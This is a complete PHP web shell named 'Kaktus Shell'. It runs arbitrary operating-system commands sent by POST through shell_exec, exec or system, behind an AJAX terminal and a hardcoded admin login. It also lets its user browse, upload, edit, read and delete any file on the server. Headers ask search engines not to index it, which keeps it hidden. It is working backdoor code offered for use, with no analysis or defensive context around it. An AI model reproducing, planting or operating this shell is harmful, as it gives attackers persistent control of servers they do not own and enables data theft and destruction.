<?php
/**
 * Kaktus Shell - Blue Advanced Shell & File Manager (single file)
 * FIXED: Terminal AJAX now works reliably.
 */

// Suppress all warnings/errors in AJAX mode to keep JSON clean
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    error_reporting(0);
    ini_set('display_errors', 0);
}

if (!function_exists('is_fn_usable')) {
    function is_fn_usable($fn) {
        if (!function_exists($fn)) return false;
        $disabled = (string) @ini_get('disable_functions');
        $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist');
        $blocked = array();
        if ($disabled !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
        if ($suhosin  !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));
        if (!empty($blocked)) {
            $blocked = array_filter(array_map('strtolower', $blocked));
            if (in_array(strtolower($fn), $blocked, true)) return false;
        }
        return true;
    }
}

date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : 'UTC');
session_start();
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(biru_random_bytes(16));
}

/* ---------- Security Headers ---------- */
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex', true);
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: SAMEORIGIN');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('X-Content-Type-Options: nosniff');

/* ---------- Auth ---------- */
define('AUTH_USER', 'admin');
define('AUTH_PASS_HASH', '$2a$12$BBaLHa.cGOJZR9697oj3auaNFtGk04W6vbsr8mqV9cwprwoPZM4SW'); // pass : n0t

/* ---------- Utility & Polyfills ---------- */
function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

if (!function_exists('je')) {
    function je($v) {
        if (function_exists('json_encode')) return json_encode($v);
        if (is_bool($v)) return $v ? 'true' : 'false';
        if (is_numeric($v)) return (string)$v;
        if ($v === null) return 'null';
        if (is_array($v) || is_object($v)) {
            $parts = array();
            $is_list = (is_array($v) && array_keys($v) === range(0, count($v) - 1));
            foreach ($v as $key => $val) {
                $parts[] = $is_list ? je($val) : '"'.h($key).'":'.je($val);
            }
            return $is_list ? '['.implode(',', $parts).']' : '{'.implode(',', $parts).'}';
        }
        return '"'.str_replace(array("\\","\"","\r","\n"), array("\\\\","\\\"","\\r","\\n"), (string)$v).'"';
    }
}

function biru_random_bytes($len){
    if (is_fn_usable('random_bytes')) return random_bytes($len);
    $out = ''; for ($i = 0; $i < $len; $i++) $out .= chr(mt_rand(0, 255));
    return $out;
}

function humanSize($b){
    $u = array('B','KB','MB','GB','TB'); $i = 0;
    while ($b >= 1024 && $i < count($u)-1){ $b/=1024; $i++; }
    return ($i ? number_format($b,2) : (string)$b) . ' ' . $u[$i];
}

function permsToString($f){
    $p = @fileperms($f); if ($p === false) return '??????????';
    $t = ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
    $s  = (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? 'x' : '-');
    $s .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? 'x' : '-');
    $s .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-');
    return $t.$s;
}

function isTextFile($p){
    if (is_dir($p)) return false;
    $ext = strtolower(pathinfo((string)$p, PATHINFO_EXTENSION));
    $allowed = array('txt','md','json','js','css','php','html','ini','xml','sql','env','py','sh');
    return in_array($ext, $allowed, true);
}

function safeJoin($base,$child){
    $child = str_replace(array("\0", ".."), '', $child);
    return rtrim($base, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$child;
}

function listDirEntries($dir){
    $h = @opendir($dir); if ($h===false) return array();
    $items=array(); while(false!==($e=readdir($h))){ $items[]=$e; }
    closedir($h); return $items;
}

function rrmdir($p){
    if (is_file($p) || is_link($p)) return @unlink($p);
    $h = @opendir($p); if(!$h) return false;
    while(false!==($v=readdir($h))){ if($v==='.'||$v==='..') continue; rrmdir(safeJoin($p,$v)); }
    closedir($h); return @rmdir($p);
}

function tryWriteFromTmp($tmp,$dest){
    if(@move_uploaded_file($tmp,$dest) || @rename($tmp,$dest) || @copy($tmp,$dest)) return array(true, null);
    return array(false, "Write failed");
}

function extractArchive($archivePath, $destPath) {
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive;
        if ($zip->open($archivePath) === TRUE) {
            $zip->extractTo($destPath);
            $zip->close();
            @unlink($archivePath);
            return array(true, "Zip extracted");
        }
    }
    return array(false, "Extractor not available");
}

function breadcrumbs($path){
    $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
    $parts = array_values(array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen'));
    $out = array();
    $acc = (DIRECTORY_SEPARATOR === '\\') ? '' : DIRECTORY_SEPARATOR;
    if (DIRECTORY_SEPARATOR === '\\' && preg_match('~^[A-Z]:~i', $path)) {
        $drive = substr($path, 0, 2); $acc = $drive.'\\'; $out[] = array($drive, $acc);
    } else { $out[] = array('root', DIRECTORY_SEPARATOR); }
    foreach($parts as $p){
        if (preg_match('~^[A-Z]:$~i', $p)) continue;
        $acc = rtrim($acc, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $p;
        $out[] = array($p, $acc);
    }
    return $out;
}

function ensureCsrf(){
    if($_SERVER['REQUEST_METHOD']==='POST'){
        if (!isset($_POST['csrf']) || $_POST['csrf'] !== $_SESSION['csrf']) {
            http_response_code(403); exit("CSRF Invalid");
        }
    }
}

/* ---------- ACTIONS: AJAX Terminal Handler (must come before any output) ---------- */
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    header('Content-Type: application/json');
    // Clear any previous output buffers
    while (ob_get_level()) ob_end_clean();
    
    $response = array('error' => 'Unknown error');
    
    if (!isset($_SESSION['auth'])) {
        $response = array('error' => 'Unauthorized');
    } elseif ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        $response = array('error' => 'Invalid request method');
    } elseif (!isset($_POST['csrf']) || $_POST['csrf'] !== $_SESSION['csrf']) {
        $response = array('error' => 'CSRF token mismatch');
    } elseif (!isset($_POST['cmd'])) {
        $response = array('error' => 'No command provided');
    } else {
        $cmd = $_POST['cmd'];
        $output = '';
        
        // Try shell_exec first
        if (function_exists('shell_exec')) {
            $output = @shell_exec($cmd . ' 2>&1');
            if ($output === null) $output = '';
        } 
        // Fallback to exec
        elseif (function_exists('exec')) {
            exec($cmd . ' 2>&1', $output_lines, $ret);
            $output = implode("\n", $output_lines);
        }
        // Fallback to system
        elseif (function_exists('system')) {
            ob_start();
            @system($cmd . ' 2>&1');
            $output = ob_get_clean();
        }
        else {
            $output = 'ERROR: No command execution function available (shell_exec, exec, system all disabled)';
        }
        
        $response = array('output' => (string)$output);
    }
    
    echo json_encode($response);
    exit;
}

/* ---------- Normal (non-AJAX) request handling ---------- */
if (!isset($_SESSION['auth'])) {
    if (isset($_GET['a']) && $_GET['a'] === 'login' && isset($_POST['user'])) {
        if ($_POST['user'] === AUTH_USER && password_verify($_POST['pass'], AUTH_PASS_HASH)) {
            $_SESSION['auth'] = true; header("Location: ?"); exit;
        }
    }
    // Render Login Page
    echo '<body style="background:#0b1220;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center;font-family:sans-serif;"><form method="POST" action="?a=login" style="background:#111827;padding:2rem;border-radius:12px;border:1px solid #374151;"><h3>kaktus LOGIN</h3><input name="user" placeholder="User" style="display:block;margin-bottom:10px;padding:8px;width:200px;"><input name="pass" type="password" placeholder="Pass" style="display:block;margin-bottom:10px;padding:8px;width:200px;"><button type="submit" style="width:100%;padding:8px;background:#3b82f6;color:#fff;border:none;border-radius:4px;cursor:pointer;">Login</button></form></body>'; 
    exit;
}

$initial_script_dir = realpath(getcwd());
$requested_path = isset($_GET['d']) ? (string)$_GET['d'] : '';
$current_path = (realpath($requested_path) && is_dir(realpath($requested_path))) ? realpath($requested_path) : $initial_script_dir;

$msg = ''; $cmd_out = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ensureCsrf();
    $a = isset($_GET['a']) ? $_GET['a'] : '';
    
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'] . ' 2>&1';
        $cmd_out = h(shell_exec($cmd));
    }
    if ($a === 'upload' && isset($_FILES['file'])) {
        $dest = safeJoin($current_path, $_FILES['file']['name']);
        list($ok, $err) = tryWriteFromTmp($_FILES['file']['tmp_name'], $dest);
        $msg = $ok ? "Uploaded: ".$_FILES['file']['name'] : "Error: $err";
    }
    if ($a === 'save_file' && isset($_POST['target_file'])) {
        if (@file_put_contents($_POST['target_file'], $_POST['file_content']) !== false) {
            $msg = "File saved!";
        }
    }
}

if (isset($_GET['a']) && $_GET['a'] === 'del' && isset($_GET['path'])) {
    if (rrmdir($_GET['path'])) $msg = "Deleted!";
}

if (isset($_GET['a']) && $_GET['a'] === 'edit_file' && isset($_GET['path'])) {
    header('Content-Type: text/plain');
    echo @file_get_contents($_GET['path']);
    exit;
}

if (isset($_GET['a']) && $_GET['a'] === 'logout') { session_destroy(); header("Location: ?"); exit; }

/* ---------- UI Icons (same as before) ---------- */
function svgIcon($name, $class='w-5 h-5 text-slate-400'){
    $icons = array(
        'folder'=>'<svg class="'.$class.'" fill="currentColor" viewBox="0 0 24 24"><path d="M10 4l2 2h6a2 2 0 012 2v1H4V6a2 2 0 012-2h4z" opacity=".3"/><path d="M3 9h18v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/></svg>',
        'file'=>'<svg class="'.$class.'" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>',
        'trash'=>'<svg class="'.$class.' text-red-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>',
        'edit'=>'<svg class="'.$class.' text-green-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>'
    );
    return isset($icons[$name]) ? $icons[$name] : '';
}
?>
<!doctype html>
<html lang="en" class="dark">
<head>
    <meta charset="utf-8">
    <title>Kaktus BLUE SHELL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0b1220; color: #e5e7eb; font-family: 'Ubuntu', sans-serif; }
        .card { background: rgba(15,23,42,0.8); border: 1px solid rgba(148,163,184,0.1); backdrop-filter: blur(10px); }
        .terminal-input:focus { outline: none; }
        .terminal-output { max-height: 400px; overflow-y: auto; }
    </style>
</head>
<body class="flex min-h-screen">
    <div class="w-64 bg-gray-900/80 border-r border-gray-800 p-6 flex flex-col justify-between">
        <div>
            <h1 class="text-2xl font-bold text-blue-400 mb-8">Kaktus Web Shell</h1>
            <nav class="space-y-4">
                <a href="?d=<?= urlencode($initial_script_dir) ?>" class="block hover:text-blue-300">Home</a>
                <a href="#shell" class="block hover:text-blue-300">Terminal</a>
            </nav>
        </div>
        <a href="?a=logout" class="text-red-500 font-bold">LOGOUT</a>
    </div>

    <div class="flex-grow p-8 overflow-auto">
        <?php if($msg): ?><div class="bg-blue-600/20 border border-blue-500 p-3 mb-4 rounded"><?= h($msg) ?></div><?php endif; ?>

        <div class="flex gap-2 text-sm mb-6 bg-gray-800/40 p-3 rounded-lg">
            <?php foreach(breadcrumbs($current_path) as $bc): ?>
                <a href="?d=<?= urlencode($bc[1]) ?>" class="text-blue-400 hover:underline"><?= h($bc[0]) ?></a> <span class="text-gray-600">/</span>
            <?php endforeach; ?>
        </div>

        <div class="card p-6 rounded-xl mb-8">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-lg font-bold">File Manager</h3>
                <form action="?d=<?= urlencode($current_path) ?>&a=upload" method="POST" enctype="multipart/form-data" class="flex gap-2">
                    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
                    <input type="file" name="file" class="text-xs">
                    <button class="bg-blue-600 px-3 py-1 rounded text-xs font-bold">UPLOAD</button>
                </form>
            </div>
            <table class="w-full text-left text-sm">
                <thead><tr class="border-b border-gray-800 text-gray-400"><th>Name</th><th>Size</th><th class="text-right">Action</th></tr></thead>
                <tbody>
                    <?php
                    $files = listDirEntries($current_path);
                    natcasesort($files);
                    foreach($files as $f): if($f=='.'||$f=='..') continue;
                        $path = safeJoin($current_path, $f);
                        $is_dir = is_dir($path);
                    ?>
                    <tr class="border-b border-gray-800/50 hover:bg-gray-800/30">
                        <td class="py-3">
                            <a href="<?= $is_dir ? '?d='.urlencode($path) : '#' ?>" class="flex items-center gap-2 <?= $is_dir ? 'text-amber-400' : 'text-gray-300' ?>">
                                <?= svgIcon($is_dir ? 'folder' : 'file') ?> <?= h($f) ?>
                            </a>
                        </td>
                        <td class="text-gray-500"><?= $is_dir ? 'DIR' : humanSize(@filesize($path)) ?></td>
                        <td class="text-right flex justify-end gap-3 py-3">
                            <?php if(!$is_dir && isTextFile($path)): ?>
                                <button onclick="openEditor('<?= h($path) ?>')" title="Edit"><?= svgIcon('edit') ?></button>
                            <?php endif; ?>
                            <a href="?d=<?= urlencode($current_path) ?>&a=del&path=<?= urlencode($path) ?>" onclick="return confirm('Delete?')"><?= svgIcon('trash') ?></a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <!-- TERMINAL SECTION - FIXED -->
        <div id="shell" class="card p-6 rounded-xl">
            <h3 class="text-lg font-bold mb-4">Interactive Terminal</h3>
            <div id="terminal-output" class="terminal-output bg-black/70 rounded p-3 font-mono text-sm text-green-400 mb-3" style="height: 300px; overflow-y: auto;">
                <div>>_ Terminal ready. Type command below.</div>
            </div>
            <form id="terminal-form" class="flex gap-2">
                <input type="hidden" name="csrf" id="csrf-token" value="<?= $_SESSION['csrf'] ?>">
                <span class="text-green-400 font-mono">$</span>
                <input type="text" name="cmd" id="terminal-cmd" class="terminal-input flex-grow bg-transparent border-none text-green-400 font-mono focus:outline-none" autocomplete="off" autofocus>
                <button type="submit" class="bg-blue-600 px-3 py-1 rounded text-xs">Run</button>
                <button type="button" id="clear-terminal" class="bg-gray-700 px-3 py-1 rounded text-xs">Clear</button>
            </form>
            <div class="text-xs text-gray-500 mt-2">Tip: Use standard commands (ls, pwd, whoami, etc.)</div>
        </div>
    </div>

    <div id="editorModal" class="fixed inset-0 bg-black/80 hidden flex items-center justify-center p-8">
        <div class="card w-full max-w-4xl h-full flex flex-col p-6 rounded-2xl">
            <h3 id="editTitle" class="mb-4 font-bold text-blue-400">Editor</h3>
            <form action="?d=<?= urlencode($current_path) ?>&a=save_file" method="POST" class="flex-grow flex flex-col">
                <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
                <input type="hidden" name="target_file" id="target_file">
                <textarea name="file_content" id="file_content" class="w-full flex-grow bg-gray-900 border border-gray-700 p-4 font-mono text-sm rounded mb-4"></textarea>
                <div class="flex justify-end gap-4">
                    <button type="button" onclick="closeEditor()" class="px-6 py-2 bg-gray-700 rounded-lg">Cancel</button>
                    <button type="submit" class="px-6 py-2 bg-blue-600 rounded-lg font-bold">SAVE CHANGES</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Terminal AJAX handling with better error management
        const termOutput = document.getElementById('terminal-output');
        const termForm = document.getElementById('terminal-form');
        const termCmd = document.getElementById('terminal-cmd');
        const csrfToken = document.getElementById('csrf-token').value;

        function appendToTerminal(text, isError = false) {
            const line = document.createElement('div');
            line.className = 'mb-1';
            line.style.color = isError ? '#f87171' : '#4ade80';
            line.textContent = text;
            termOutput.appendChild(line);
            termOutput.scrollTop = termOutput.scrollHeight;
        }

        termForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const cmd = termCmd.value.trim();
            if (cmd === '') return;
            appendToTerminal(`$ ${cmd}`);
            termCmd.value = '';
            termCmd.focus();
            
            try {
                const formData = new URLSearchParams();
                formData.append('csrf', csrfToken);
                formData.append('cmd', cmd);
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: formData.toString()
                });
                
                // Check if response is OK
                if (!response.ok) {
                    appendToTerminal(`HTTP Error: ${response.status} ${response.statusText}`, true);
                    return;
                }
                
                const text = await response.text();
                let data;
                try {
                    data = JSON.parse(text);
                } catch (jsonError) {
                    console.error('Raw response:', text);
                    appendToTerminal(`Server returned invalid JSON. Raw response (first 200 chars): ${text.substring(0,200)}`, true);
                    return;
                }
                
                if (data.error) {
                    appendToTerminal(`Error: ${data.error}`, true);
                } else if (data.output !== undefined) {
                    const output = data.output.trim();
                    if (output) {
                        output.split('\n').forEach(line => appendToTerminal(line));
                    } else {
                        appendToTerminal('(no output)');
                    }
                } else {
                    appendToTerminal('Unexpected response format', true);
                }
            } catch (err) {
                appendToTerminal(`Request failed: ${err.message}`, true);
            }
            appendToTerminal(''); // blank line
        });

        document.getElementById('clear-terminal').addEventListener('click', () => {
            termOutput.innerHTML = '<div>>_ Terminal cleared.</div>';
        });

        function openEditor(path) {
            document.getElementById('target_file').value = path;
            document.getElementById('editTitle').innerText = "Editing: " + path.split('/').pop();
            fetch('?a=edit_file&path=' + encodeURIComponent(path))
                .then(r => r.text())
                .then(data => {
                    document.getElementById('file_content').value = data;
                    document.getElementById('editorModal').classList.remove('hidden');
                })
                .catch(err => alert('Failed to load file: ' + err.message));
        }
        function closeEditor() { document.getElementById('editorModal').classList.add('hidden'); }
    </script>
</body>
</html>
